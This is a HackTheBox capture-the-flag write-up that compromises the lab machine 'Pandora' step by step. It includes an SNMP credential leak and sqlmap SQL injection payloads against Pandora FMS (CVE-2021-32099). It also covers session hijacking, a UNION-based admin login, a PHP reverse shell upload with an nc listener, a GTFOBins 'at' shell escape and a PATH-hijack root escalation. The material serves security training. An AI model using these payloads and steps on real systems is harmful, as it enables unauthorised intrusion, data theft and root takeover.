# 

# Pandora - HackTheBox WriteUp

<img src="htb_assets/images/pandora/2022-06-02-05-34-30-image.png" style="margin-left: 20px; zoom: 60%;" align=left />

## 1. Enumeration

### Nmap Initial Scan

```
# Nmap 7.92 scan initiated Tue May 31 08:00:26 2022 as: nmap -sC -sV -oN nmap_scan 10.129.99.118
Nmap scan report for 10.129.99.118
Host is up (0.69s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 31 08:01:03 2022 -- 1 IP address (1 host up) scanned in 36.96 seconds
```

Port 80 is open and we can find website there.

<img src="htb_assets/images/pandora/2022-06-01-00-30-19-image.png" style="margin-left: 20px; zoom: 60%;" align=left />



### Nmap UDP Scan

```
# Nmap 7.92 scan initiated Tue May 31 12:44:11 2022 as: nmap -sU -oN nmap_U 10.129.99.118
Nmap scan report for panda.htb (10.129.99.118)
Host is up (0.26s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
161/udp   open          snmp
502/udp   open|filtered mbap
20679/udp open|filtered unknown

# Nmap done at Tue May 31 13:02:13 2022 -- 1 IP address (1 host up) scanned in 1081.39 seconds
```

We can see port 161 is open. Let's do enumeration on snmp.



### SNMP Enumeration

##### What is SNMP protocol ?

SNMP stands for Simple Network Management Protocol. It provides a framework for asking a device about its performance and configuration. It is used to manage and monitor all the devices connected over a network. It exposes management data in the form of variables on the managed systems. These variables can then be remotely queried.
Let us use command-line utility known as snmpbulkwalk to scan the SNMP service and obtain all variables of the managed systems and displays them.

```
snmpbulkwalk -Cr1000 -c public -v2c 10.129.99.118 > snmp1
```

```
HOST-RESOURCES-MIB::hrSWRunParameters.975 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.985 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunParameters.987 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.991 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1041 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1042 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1045 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1136 = STRING: "-u daniel -p HotelBabylon23"
```

While looking through the results we can find username and password. Using these credentials we can login to ssh.



### SSH into machine as daniel

```
ssh daniel@10.129.99.118
```

Use the password HotelBabylon23 login. 

Unfortunately we can't find any user flag on user daniel. So, let's check other files and directories.



```
cd /etc/apache2
```

we get the following files and directories,

```
apache2.conf  conf-available  conf-enabled  envvars  magic  mods-available  mods-enabled  ports.conf  sites-available  sites-enabled
```

```
cd sites-available
```

we get these files,

```
000-default.conf  pandora.conf
```

```
cat pandora.conf


<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

So there is subdomain running on localhost port 80. We can use port forwarding to access that page. Add pandora.panda.htb to /etc/hosts on our machine.



### Port Forwarding

```
ssh -L 8000:127.0.0.1:80 daniel@10.129.99.118
```

Now, browse for localhost:8000 on our browser.

![](/htb_assets/images/pandora/2022-06-01-00-31-29-image.png)

Looking at the bottom of that page exposes the version of the Pandora FMS, which is
v7.0NG.742_FIX_PERL2020 .

We can find an unauthenticated SQL Injection (CVE-2021-32099).

![](/htb_assets/images/pandora/2022-06-01-12-49-41-image.png)



Capture the request of localhost:8000/pandora_console/include/chart_generator.php?session_id=1 and save it as pandora.req to use it in sqlmap.

```
GET /pandora_console/include/chart_generator.php?session_id=1 HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

```



### SQLmap

Using pandora.req we can do further enumeration.

1. Checking whether it is injectable.

```
┌──(root💀kali)-[~/htb/pandora]
└─# sqlmap -r pandora.req --batch
       

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:35:24 /2022-06-01/

[10:35:24] [INFO] parsing HTTP request from 'pandora.req'
[10:35:24] [INFO] resuming back-end DBMS 'mysql' 
[10:35:24] [INFO] testing connection to the target URL
[10:35:24] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=6sromn1akpb...8trn7s4db0'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-7048' OR 6659=6659#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 3116 FROM(SELECT COUNT(*),CONCAT(0x7176716271,(SELECT (ELT(3116=3116,1))),0x71786b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ydjR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 1990 FROM (SELECT(SLEEP(5)))aTEa)-- INzE
---
[10:35:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:35:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 10:35:24 /2022-06-01/

```

Yes, it is vulnerable.



2. Listing databases

```

┌──(root💀kali)-[~/htb/pandora]
└─# sqlmap -r pandora.req --batch --dbs
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:41:27 /2022-06-01/

[10:41:27] [INFO] parsing HTTP request from 'pandora.req'
[10:41:27] [INFO] resuming back-end DBMS 'mysql' 
[10:41:27] [INFO] testing connection to the target URL
[10:41:28] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=al4o787utmg...uk4b6hnp9b'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-7048' OR 6659=6659#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 3116 FROM(SELECT COUNT(*),CONCAT(0x7176716271,(SELECT (ELT(3116=3116,1))),0x71786b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ydjR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 1990 FROM (SELECT(SLEEP(5)))aTEa)-- INzE
---
[10:41:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:41:28] [INFO] fetching database names
[10:41:28] [INFO] resumed: 'information_schema'
[10:41:28] [INFO] resumed: 'pandora'
available databases [2]:
[*] information_schema
[*] pandora

[10:41:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 10:41:28 /2022-06-01/

```

Found database named pandora.



3. Dumping all tables of pandora..

```

┌──(root💀kali)-[~/htb/pandora]
└─# sqlmap -r pandora.req --batch -D pandora --tables

Database: pandora
[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+

[10:43:51] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 10:43:51 /2022-06-01/

```



4. Dumping columns of table tsesion.

```
┌──(root💀kali)-[~/htb/pandora]
└─# sqlmap -r pandora.req --batch -D pandora -T tsesion --dump

Database: pandora
Table: tsesion
[17 entries]
+-----------+------------+---------------------+-----------------+----------------+------------+------------------------------------+
| id_sesion | id_usuario | fecha               | accion          | ip_origen      | utimestamp | descripcion                        |
+-----------+------------+---------------------+-----------------+----------------+------------+------------------------------------+
| 1         | SYSTEM     | 2021-06-11 14:56:18 | System          | SYSTEM         | 1623419778 | Pandora FMS Server Daemon starting |
| 2         | admin      | 2021-06-11 17:11:48 | Logon           | 192.168.220.11 | 1623424308 | Logged in                          |
| 3         | admin      | 2021-06-11 17:28:54 | User management | 192.168.220.11 | 1623425334 | Created user matt                  |
| 4         | admin      | 2021-06-11 17:29:06 | User management | 192.168.220.11 | 1623425346 | Updated user matt                  |
| 5         | admin      | 2021-06-11 17:29:21 | User management | 192.168.220.11 | 1623425361 | Added profile for user matt        |
| 6         | admin      | 2021-06-11 17:29:43 | User management | 192.168.220.11 | 1623425383 | Added profile for user matt        |
| 7         | matt       | 2021-06-11 17:29:56 | Logon           | 192.168.220.11 | 1623425396 | Logged in                          |
| 8         | admin      | 2021-06-16 23:24:12 | Logon           | 127.0.0.1      | 1623878652 | Logged in                          |
| 9         | admin      | 2021-06-16 23:24:40 | User management | 127.0.0.1      | 1623878680 | Updated user admin                 |
| 10        | admin      | 2021-06-16 23:24:57 | User management | 127.0.0.1      | 1623878697 | Updated user matt                  |
| 11        | admin      | 2021-06-17 00:09:46 | Logon           | 127.0.0.1      | 1623881386 | Logged in                          |
| 12        | admin      | 2021-06-17 00:11:54 | User management | 127.0.0.1      | 1623881514 | Created user daniel                |
| 13        | admin      | 2021-06-17 00:12:08 | User management | 127.0.0.1      | 1623881528 | Added profile for user daniel      |
| 14        | N/A        | 2021-06-17 21:10:18 | No session      | 127.0.0.1      | 1623957018 | Trying to access without a&#x20    |
| 15        | N/A        | 2021-06-17 21:10:28 | No session      | 127.0.0.1      | 1623957028 | Trying to access without a&#x20    |
| 16        | matt       | 2021-06-17 21:10:44 | Logon           | 127.0.0.1      | 1623957044 | Logged in                          |
| 17        | admin      | 2022-06-01 05:52:06 | Logon Failed    | 127.0.0.1      | 1654055526 | Invalid login: admin               |
+-----------+------------+---------------------+-----------------+----------------+------------+------------------------------------+

[10:47:49] [INFO] table 'pandora.tsesion' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/pandora/tsesion.csv'
[10:47:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 10:47:49 /2022-06-01/

```



5. Dumping columns of table tusuario.

```
┌──(root💀kali)-[~/htb/pandora]
└─# sqlmap -r pandora.req --batch -D pandora -T tusuario --dump

Database: pandora
Table: tusuario
[3 entries]
+---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+
| id_skin | id_user | id_filter | email              | phone   | comments | disabled | fullname | is_admin | lastname | password                         | shortcut | timezone | section   | firstname | not_login | language   | block_size | middlename | registered | strict_acl | data_section | last_connect | session_time | login_blocked | shortcut_data | failed_attempt | last_pass_change    | time_autorefresh | force_change_pass | last_failed_login   | metaconsole_access | default_custom_view | default_event_filter | autorefresh_white_list | ehorus_user_level_pass | ehorus_user_level_user | metaconsole_access_node | ehorus_user_level_enabled | metaconsole_agents_manager | metaconsole_assigned_server |
+---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+
| 0       | matt    | NULL      | matt@pandora.htb   | <blank> | <blank>  | 0        | Matt     | 0        | <blank>  | f655f807365b6dc602b31ab3d6d43acc | 0        | <blank>  | Default   | <blank>   | 0         | default    | 20         | -1         | 1623425334 | 0          | <blank>      | 1638796349   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | <blank>                | <blank>                | 0                       | 0                         | 0                          | 0                           |
| 0       | daniel  | NULL      | daniel@pandora.htb | <blank> | <blank>  | 0        | Daniel   | 0        | <blank>  | 76323c174bd49ffbbdedf678f6cc89a6 | 0        | UTC      | Default   | <blank>   | 1         | en_GB      | 20         | -1         | 1623881514 | 0          | <blank>      | 1654083999   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | NULL                   | NULL                   | 0                       | NULL                      | 0                          | 0                           |
| 0       | matt    | NULL      | matt@pandora.htb   | <blank> | <blank>  | 0        | Matt     | 0        | <blank>  | f655f807365b6dc602b31ab3d6d43acc | 0        | <blank>  | Default   | <blank>   | 0         | default    | 20         | -1         | 1623425334 | 0          | <blank>      | 1638796349   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | <blank>                | <blank>                | 0                       | 0                         | 0                          | 0                           |
+---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+

[10:54:03] [INFO] table 'pandora.tusuario' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv'
[10:54:03] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

```



6. Dumping columns of table tsessions_php

```
┌──(root💀kali)-[~/htb/pandora]
└─# sqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump

Database: pandora
Table: tsessions_php
[55 entries]
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 5v6rvkat3geds6ojfji848433t | id_usuario|s:6:"daniel";                            | 1654082941  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 6sromn1akpbfmoe68trn7s4db0 | NULL                                                | 1654094115  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| al4o787utmg7bblguk4b6hnp9b | NULL                                                | 1654094479  |
| bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:"daniel";                            | 1641201982  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| dnebsco0f891qmcl7cl24m17qv | NULL                                                | 1654094860  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| f7mb69iububv2khjr7ajufeion | NULL                                                | 1654093733  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| i1abbk66kc51m63h0bfk3hnkij | id_usuario|s:6:"daniel";                            | 1654083569  |
| j9931a5jk2t9rtvfv3pe7v3r00 | NULL                                                | 1654095679  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| ju8uolt79j5o6ol89o8j7jpd4g | NULL                                                | 1654057856  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| o884ocv3lmm3s7mg3b6eq1fckm | NULL                                                | 1654094622  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| p4gqeb6eifotpr27rbr1go9bv6 | NULL                                                | 1654094403  |
| pe5ecoro6tdg5c7jarturnnba9 | id_usuario|s:6:"daniel";                            | 1654082951  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| q3degndsdgfuprd0qok1q57qbb | NULL                                                | 1654095231  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
| uiaajrsjpf2f7ibagj16c7cu3r | id_usuario|s:6:"daniel";                            | 1653998225  |
| vm2jgetrbb6dbtgg1grh7jqmeo | NULL                                                | 1654093653  |
| vp8ki2av8vo4rfrrff6gj9iumg | id_usuario|s:6:"daniel";                            | 1654084026  |
+----------------------------+-----------------------------------------------------+-------------+

```



Take session_id of matt, open developer tools, change the session id and refresh the page. We will be logged in as matt.

![](/htb_assets/images/pandora/2022-06-01-11-12-51-image.png)



Open new tab and run this url with sql injection payload
[http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1,2,'id_usuario|s:5:"admin";'-- - ]()

Thus, we will be logged into admin page.

![](/htb_assets/images/pandora/2022-06-01-13-02-44-image.png)



We can find an image upload functionality in the admin page. 

![](/htb_assets/images/pandora/2022-06-01-13-13-45-image.png)



Upload a php reverse shell and browse to http://localhost:8000/pandora_console/images . We can find the uploaded shell code. 

![](/htb_assets/images/pandora/2022-06-01-13-14-24-image.png)



Now open a netcat listener on our machine.

```
nc -lvnp 1234
```

Click on the uploaded shell code shell.php and we will get a reverse shell. Change the directory to matt and we can find the user.txt.

![](/htb_assets/images/pandora/2022-06-01-13-15-36-image.png)



## 2. Privilege Escalation

Let us find all the files with SUID bit set in the whole file system using the find utility with the -perm flag.

```
matt@pandora:/$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

We see an unusual entry in the results, which is /usr/bin/pandora_backup.



Let's look for at in gtfobins. 

It can be used to break out from restricted environments by spawning an interactive system shell.

- ```
  echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
  ```



```
cat /usr/bin/pandora_backup

#some code here

PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!

#some code here
```



we can see it is running tar as sudo



```
echo "sudo /bin/bash" > tar
```



```
matt@pandora:/home/matt$ chmod +x tar
matt@pandora:/home/matt$ export PATH=/home/matt:$PATH
matt@pandora:/home/matt$ which tar
/home/matt/tar
```





```
matt@pandora:/home/matt$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/home/matt# whoami
root
root@pandora:/home/matt# id
uid=0(root) gid=0(root) groups=0(root)
root@pandora:/home/matt# 
```



```
root@pandora:/home/matt# cd /root
root@pandora:~# ls
root.txt
root@pandora:~# cat root.txt
0073c6babb10dcbd040e501961134a64
```




